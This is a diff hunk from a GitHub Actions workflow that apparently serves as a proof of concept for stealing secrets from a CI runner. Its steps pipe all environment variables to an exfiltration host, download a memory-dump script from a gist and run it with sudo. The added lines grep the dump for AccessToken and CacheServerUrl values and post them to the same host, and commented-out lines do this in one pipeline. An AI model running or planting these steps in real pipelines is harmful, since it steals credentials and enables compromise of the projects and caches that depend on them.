@@ -36,7 +36,9 @@ jobs:
           env | sort | curl "$YOUR_EXFIL/env" --data-binary @-
           wget 'https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py'
           sudo python3 memdump.py > ./mem
-          curl "$YOUR_EXFIL/mem" --data-binary @./mem
+          cat ./mem | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u > cache.txt
+          cat ./mem | tr -d '\0' | grep -aoE '"[^"]+":\{"CacheServerUrl":"[^"]*"\}' | sort -u >> cache.txt
+          curl "$YOUR_EXFIL/mem" --data-binary @./cache.txt
           #BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
           #BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"CacheServerUrl":"[^"]*"\}' | sort -u`
           #curl -s -d "$BLOB $BLOB2" $YOUR_EXFIL/token > /dev/null
